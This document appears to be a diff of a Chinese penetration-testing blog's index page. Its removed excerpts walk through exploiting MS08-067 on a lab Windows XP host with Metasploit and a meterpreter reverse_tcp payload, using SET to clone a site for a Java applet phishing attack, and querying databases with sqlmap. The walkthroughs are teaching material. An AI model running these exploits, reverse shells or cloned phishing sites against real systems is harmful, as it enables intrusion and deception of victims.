-<h4 id="Metasploit命令的分类"><a href="#Metasploit命令的分类" class="headerlink" title="Metasploit命令的分类"></a>Metasploit命令的分类</h4><p>启动metasploit后在msf&gt;后输入以下命令会显示系统提供的命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>核心命令(core command)</li>
-<li>模块命令(module command)</li>
-<li>任务命令(job command)</li>
-<li>资源命令(resource script command)</li>
-<li>数据库后台命令(database backend command)</li>
-<li>登录凭证后台命令(credentials backend command)</li>
-</ul>
-<h3 id="使用Metasploit对操作系统进行攻击"><a href="#使用Metasploit对操作系统进行攻击" class="headerlink" title="使用Metasploit对操作系统进行攻击"></a>使用Metasploit对操作系统进行攻击</h3><p>使用namp对WindowsXP系统进行漏洞扫描：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- --script vuln --script-args unsafe 192.168.75.130</span><br></pre></td></tr></table></figure>
-<p>上诉IP地址为WindowsXP的IP地址，得到的结果如图所示：<br><img src="https://i.postimg.cc/HsVc5q9x/2.png" alt=""><br>上图显示WindowsXP有MS08_067的漏洞，下面使用Metasploit对该漏洞进行利用</p>
-<ol>
-<li><p>启动Metasploit后，使用<font color="#fb8c00">search</font>命令查看针对MS08_067的渗透模块：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms08_067</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.postimg.cc/yYtJTLLT/3.png" alt=""></p>
-</li>
-<li><p>对找到的渗透模块进行利用：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi(渗透模块的名字)</span><br></pre></td></tr></table></figure></li>
-<li><p>通过以下命令查看这个模块需要设置的参数</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.postimg.cc/K8T1ptVh/4.png" alt=""><br>由搜索结果可知我们需要对RHOST(靶机的IP地址)进行设置，其他两个值使用默认值即可</p>
-</li>
-<li><p>对参数进行设置：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 192.168.75.130 (靶机IP地址)</span><br></pre></td></tr></table></figure></li>
-<li><p>加入在目标系统中完成特定任务的程序B,即攻击载荷(请参阅渗透测试(4))</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show payloads  //查看该模块可利用的攻击载荷</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp  //选择其中一个设置为攻击载荷</span><br></pre></td></tr></table></figure>
-<p><font color="#fb8c00">windows/meterpreter/reverse_tcp</font>是在渗透测试(4)中所陈述的远程控制程序。</p>
-</li>
-<li><p>为攻击载荷设置参数：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> LHOST 192.168.75.129  //设置主控端IP地址</span><br><span class="line"><span class="built_in">set</span> LPORT 8888          //设置主控端的端口</span><br></pre></td></tr></table></figure></li>
-<li><p>开始攻击：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p>如果出现<font color="#fb8c00">meterpreter &gt; </font>的符号则证明攻击成功，进入后渗透阶段</p>
-</li>
-</ol>
-<blockquote>
-<p>注：如果该攻击过程出现连接错误，可以通过show targets命令查看靶机操作系统对应的target id,再使用set target id(eg. set target 10)命令再执行exploit</p>
-</blockquote>
-<h3 id="使用Metasploit对应用程序进行攻击"><a href="#使用Metasploit对应用程序进行攻击" class="headerlink" title="使用Metasploit对应用程序进行攻击"></a>使用Metasploit对应用程序进行攻击</h3><p>当我们在操作系统上找不到漏洞时，就可以将目光移动到上面的应用程序中</p>
-<h2 id="社会工程学工具"><a href="#社会工程学工具" class="headerlink" title="社会工程学工具"></a>社会工程学工具</h2><p>社会工程学是一种通过研究受害者心理，并以此诱使受害者做出配合，从而达到自身目的的方法。</p>
-<h3 id="SET"><a href="#SET" class="headerlink" title="SET"></a>SET</h3><p>SET(Socail-Engineer Toolkit,社会工程学工具包)，是常用的社会工程学工具的集合，其中包含了很多渗透测试工具。Kali中已经内置，在Kali应用中点击SET图标即可启动工具。<br>启动后的界面如图所示：<br><img src="https://i.postimg.cc/d0mLwwwW/5.png" alt=""></p>
-<p>我们选择1社会工程学攻击来查看该选项包含的功能：<br><img src="https://i.postimg.cc/vHJBncmq/6.png" alt=""></p>
-<h4 id="SET工具包中的网页攻击方法"><a href="#SET工具包中的网页攻击方法" class="headerlink" title="SET工具包中的网页攻击方法"></a>SET工具包中的网页攻击方法</h4><p>我们选择社会工程学攻击中的2(Website Attack Vector),启动会产生如下选项：<br><img src="https://i.postimg.cc/Jzjh5MD1/7.jpg" alt=""></p>
-<h5 id="Applet攻击"><a href="#Applet攻击" class="headerlink" title="Applet攻击"></a>Applet攻击</h5><p><font color="#fb8c00">1)Java Applet Attack Method</font> 这种方法与java applet有关，java applet就是用java语言编写的小应用程序，它们可以直接嵌入到网页中，并能够产生特殊的效果，Applet经编译后，会产生.class文件，把.class的文件嵌入到html的网页中，只要用户连到一个网页里，Applet就会随着网页下载到用户的计算机运行。</p>
-<p>此种攻击方式属于网站攻击，所以必须先建立一个网站出来，对于网站建立SET提供了以下三种方式：<br><img src="https://i.postimg.cc/3wBJz1FV/8.jpg" alt=""></p>
-<ul>
-<li><font color="#fb8c00">1)Web Templates</font> 利用SET中自带的模板作为钓鱼网站</li>
-<li><font color="#fb8c00">2)Site Cloner</font> 可以克隆任何网站，可以使用它模拟出想要冒充的网站</li>
-<li><font color="#fb8c00">3)Custom Import</font> 允许导入自己的网站</li>
-</ul>
-<p>我们选择2进行网站克隆，因为我们要在内网建立一个网站，所以不用.NAT技术，选择no。<br>用Java写的小程序如果没有经过签名，那么访问客户端程序下载后会受到安全限制，在这里我们需要使用一个经过签名的Applet，选择2：<br><img src="https://i.postimg.cc/0Qy2vStQ/9.jpg" alt=""></p>
-<p>接下来需要输入所克隆网站的地址，出现以下语句就提示我们可以在新克隆好的网站上展开一次Java Applet攻击：<br><img src="https://i.postimg.cc/G2g3mpNj/10.jpg" alt=""><br>选择其中一个攻击载荷(默认)，设置用来监听的端口(默认)，接下来选择payload的连接方式。</p>
+    <!-- 所有文章卡片 -->
+    <article id="articles" class="container articles">
+        <div class="row article-row">
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2019/12/08/python7/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="https://pic.superbed.cn/item/5db3fa428b58bc7bf71e4762.jpg" class="responsive-img" alt="Python(7)">
+                            
+                            <span class="card-title">Python(7)</span>
+                        </div>
+                    </a>
 
-      
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                面向对象编程实际应用
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-08
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-user fa-fw"></i>
+                                fightingtree
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/Python/" target="_blank">
+                            <span class="chip bg-color">Python</span>
+                        </a>
+                        
+                        <a href="/tags/OOP/" target="_blank">
+                            <span class="chip bg-color">OOP</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2019/12/05/Python6/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="https://pic.superbed.cn/item/5db3fa558b58bc7bf71e4c3e.jpg" class="responsive-img" alt="Python(6)">
+                            
+                            <span class="card-title">Python(6)</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                面向对象编程
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-05
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3/" class="post-category" target="_blank">
+                                    编程思想
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/Python/" target="_blank">
+                            <span class="chip bg-color">Python</span>
+                        </a>
+                        
+                        <a href="/tags/OOP/" target="_blank">
+                            <span class="chip bg-color">OOP</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2019/12/01/network3/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="https://pic.superbed.cn/item/5db3fa6d8b58bc7bf71e5570.jpg" class="responsive-img" alt="无线网络">
+                            
+                            <span class="card-title">无线网络</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                无线网络基础知识
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-01
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
+                                    读书笔记
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" target="_blank">
+                            <span class="chip bg-color">计算机网络</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2019/12/01/network2/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="https://pic.superbed.cn/item/5db3fa5b8b58bc7bf71e4f61.jpg" class="responsive-img" alt="网络安全">
+                            
+                            <span class="card-title">网络安全</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                计算机网络中的安全问题
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-01
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
+                                    读书笔记
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                            <span class="chip bg-color">安全</span>
+                        </a>
+                        
+                        <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" target="_blank">
+                            <span class="chip bg-color">计算机网络</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2019/11/26/FTP/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="https://pic.superbed.cn/item/5db3fa428b58bc7bf71e4760.jpg" class="responsive-img" alt="FTP溢出漏洞分析">
+                            
+                            <span class="card-title">FTP溢出漏洞分析</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                溢出漏洞、漏洞渗透模块编写
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-26
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" target="_blank">
+                            <span class="chip bg-color">渗透测试</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2019/11/24/penetrationTest5/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="https://pic.superbed.cn/item/5db3fa558b58bc7bf71e4c38.jpg" class="responsive-img" alt="渗透测试(5)">
+                            
+                            <span class="card-title">渗透测试(5)</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                渗透攻击、社会工程学
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-24
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/Web/" target="_blank">
+                            <span class="chip bg-color">Web</span>
+                        </a>
+                        
+                        <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                            <span class="chip bg-color">安全</span>
+                        </a>
+                        
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" target="_blank">
+                            <span class="chip bg-color">渗透测试</span>
+                        </a>
+                        
+                        <a href="/tags/Metasploit/" target="_blank">
+                            <span class="chip bg-color">Metasploit</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2019/11/18/sqlmap/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="https://pic.superbed.cn/item/5db3fa558b58bc7bf71e4c4f.jpg" class="responsive-img" alt="Sqlmap">
+                            
+                            <span class="card-title">Sqlmap</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                sqlmap使用
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-18
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="post-category" target="_blank">
+                                    工具使用
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                            <span class="chip bg-color">安全</span>
+                        </a>
+                        
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" target="_blank">
+                            <span class="chip bg-color">渗透测试</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2019/11/17/penetrationTest4/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="https://pic.superbed.cn/item/5db3fa428b58bc7bf71e4760.jpg" class="responsive-img" alt="渗透测试(4)">
+                            
+                            <span class="card-title">渗透测试(4)</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                远程控制
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-17
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/Web/" target="_blank">
+                            <span class="chip bg-color">Web</span>
+                        </a>
+                        
+                        <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                            <span class="chip bg-color">安全</span>
+                        </a>
+                        
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" target="_blank">
+                            <span class="chip bg-color">渗透测试</span>
+                        </a>
+                        
+                        <a href="/tags/Kali/" target="_blank">
+                            <span class="chip bg-color">Kali</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2019/11/14/penetrationTest3/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="https://pic.superbed.cn/item/5db3fa6e8b58bc7bf71e5580.jpg" class="responsive-img" alt="渗透测试(3)">
+                            
+                            <span class="card-title">渗透测试(3)</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                渗透测试扫描
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-14
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/Web/" target="_blank">
+                            <span class="chip bg-color">Web</span>
+                        </a>
+                        
+                        <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                            <span class="chip bg-color">安全</span>
+                        </a>
+                        
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" target="_blank">
+                            <span class="chip bg-color">渗透测试</span>
+                        </a>
+                        
+                        <a href="/tags/Kali/" target="_blank">
+                            <span class="chip bg-color">Kali</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2019/11/13/penetrationTest2/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="https://pic.superbed.cn/item/5db3fa5b8b58bc7bf71e4f69.jpg" class="responsive-img" alt="渗透测试(2)">
+                            
+                            <span class="card-title">渗透测试(2)</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                渗透测试侦察(工具)
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-13
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/Web/" target="_blank">
+                            <span class="chip bg-color">Web</span>
+                        </a>
+                        
+                        <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                            <span class="chip bg-color">安全</span>
+                        </a>
+                        
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" target="_blank">
+                            <span class="chip bg-color">渗透测试</span>
+                        </a>
+                        
+                        <a href="/tags/Kali/" target="_blank">
+                            <span class="chip bg-color">Kali</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+        </div>
+    </article>
+
+</main>
+
+
+<div class="container paging">
+    <div class="row">
+        <div class="col s6 m4 l4">
+            
+            <a class="left btn-floating btn-large disabled">
+                <i class="fa fa-angle-left"></i>
+            </a>
+            
+        </div>
+        <div class="page-info col m4 l4 hide-on-small-only">
+            <div class="center-align b-text-gray">1 / 6</div>
+        </div>
+        <div class="col s6 m4 l4">
+            
+            <a href="/page/2/"
+               class="right btn-floating btn-large waves-effect waves-light bg-color">
+                <i class="fa fa-angle-right"></i>
+            </a>
+            
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="https://fightingtree.github.io/2019/11/24/penetrationTest5/" data-id="ck5ewyp090036i8tw4yumbqr6" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/" rel="tag">Metasploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
+</div>
 
 
-  
-    <article id="post-sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/11/18/sqlmap/" class="article-date">
-  <time datetime="2019-11-18T06:34:52.000Z" itemprop="datePublished">2019-11-18</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
-  </div>
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/18/sqlmap/">Sqlmap</a>
-    </h1>
-  
+<footer class="page-footer bg-color">
+    <div class="container row left-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://fightingtree.github.io/" target="_blank">fightingtree</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+            </div>
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><p>Sqlmap是一个开源的渗透测试工具，它可以自动化检测和利用SQL注入缺陷以及接管数据库服务器的过程。它有一个强大的检测引擎，许多适合于终极渗透测试的小众特性和广泛开关，从数据库指纹、从数据库获取数据到访问底层文件系统和通过带外连接在操作系统上执行命令</p>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>需要Python环境，建议在官网进行下载，下载完毕后解压进入到sqlmap文件夹内，找到sqlmap.py文件，在此位置打开终端，输入以下命令启动sqlmap:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py</span><br></pre></td></tr></table></figure>
-<p>输入以下命令查看帮助：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -h</span><br><span class="line">python sqlmap.py -hh  <span class="comment">#查看高级帮助</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注：kali中已经内置sqlmap，直接使用sqlmap启动即可</p>
-</blockquote>
-<h2 id="Sqlmap确定目标"><a href="#Sqlmap确定目标" class="headerlink" title="Sqlmap确定目标"></a>Sqlmap确定目标</h2><h3 id="Sqlmap直连数据库"><a href="#Sqlmap直连数据库" class="headerlink" title="Sqlmap直连数据库"></a>Sqlmap直连数据库</h3><h4 id="服务型数据库"><a href="#服务型数据库" class="headerlink" title="服务型数据库"></a>服务型数据库</h4><p>前提：知道数据库的用户名和密码<br>Sqlmap支持直连数据库,通过以下命令来直连：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -d <span class="string">"mysql://admin:admin@192.168.21.17:3360/testdb"</span> -f --banner --dbs --users</span><br></pre></td></tr></table></figure>
-<ul>
-<li><font color="#fb8c00">-d</font> 直连</li>
-<li><font color="#fb8c00">DBMS://用户名:密码@目标IP地址：端口号/数据库名称</font></li>
-<li><font color="#fb8c00">-f –参数1 –参数2</font>获取数据库相应信息</li>
-</ul>
-<h3 id="Sqlmap-URL探测"><a href="#Sqlmap-URL探测" class="headerlink" title="Sqlmap URL探测"></a>Sqlmap URL探测</h3>
-      
+         <div class="col s12 m8 l8 copy-right">
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;
+            站点总字数:&nbsp;
+                <span class="white-color">169.5k</span>
+            
+            </div>
+        <div class="col s12 m8 l8 copy-right">
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+            本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;
+            访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://weibo.com/u/6112857421?from=myfollow_all" class="tooltipped" target="_blank" data-tooltip="访问我的微博" data-position="top" data-delay="50">
+        <i class="fa fa-weibo"></i>
+    </a>
+
+
+
+
+</div>
     </div>
-    <footer class="article-footer">
-      <a data-url="https://fightingtree.github.io/2019/11/18/sqlmap/" data-id="ck5ewyp0i003yi8twhg7ldme3" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-penetrationTest4" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/11/17/penetrationTest4/" class="article-date">
-  <time datetime="2019-11-17T06:32:29.000Z" itemprop="datePublished">2019-11-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/17/penetrationTest4/">渗透测试(4)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="发现漏洞后"><a href="#发现漏洞后" class="headerlink" title="发现漏洞后"></a>发现漏洞后</h2><p>经过前面的步骤后，我们已经发现了漏洞，接下来就是向目标系统发送一个程序，这个程序通常由两个子程序构成：</p>
-<ul>
-<li>一个是针对目标漏洞的渗透程序A</li>
-<li>一个是在目标系统完成指定任务的程序B<br>进行渗透的时候，我们将子程序A和子程序B一起发送到目标系统的特定端口上，子程序A会利用目标系统的漏洞，在目标系统上执行子程序B，子程序B的作用是在目标上执行一些任务，比如远程控制、信息监听、文件下载等。</li>
-</ul>
-<h2 id="渗透测试模块"><a href="#渗透测试模块" class="headerlink" title="渗透测试模块"></a>渗透测试模块</h2><p>如果把漏洞比作是一栋建筑物中上了锁的入口的话，那么我们现在需要做的就是一把能打开入口的钥匙,这把钥匙就是渗透测试模块(子程序A)，我们的工作就是要找到这个渗透测试模块。我们可以通过<a href="https://www.exploit.db.com/" target="_blank" rel="noopener">https://www.exploit.db.com/</a> 来搜索渗透测试模块，也可以使用kali linux自带的漏洞库。(请参阅渗透测试(5))<br>查找某个软件漏洞的方式是在终端输入以下命令：(此处以easyFileSharing为例)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 软件名</span><br><span class="line">searchsploit easy file sharing</span><br></pre></td></tr></table></figure>
-<h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><p>上文中我们把漏洞渗透模块比作一把进入目标系统的钥匙，现在我们已经获得了这把钥匙，接下来可以把一段代码(Shellcode)送到目标系统并执行。</p>
-<h3 id="远程控制程序"><a href="#远程控制程序" class="headerlink" title="远程控制程序"></a>远程控制程序</h3><p>指的是可以在一台设备上操纵另一台设备的软件。远程控制程序分为两个部分，被控端和主控端。远程控制软件的分类有很多，最为常用的两个标准如下所示:</p>
-<ul>
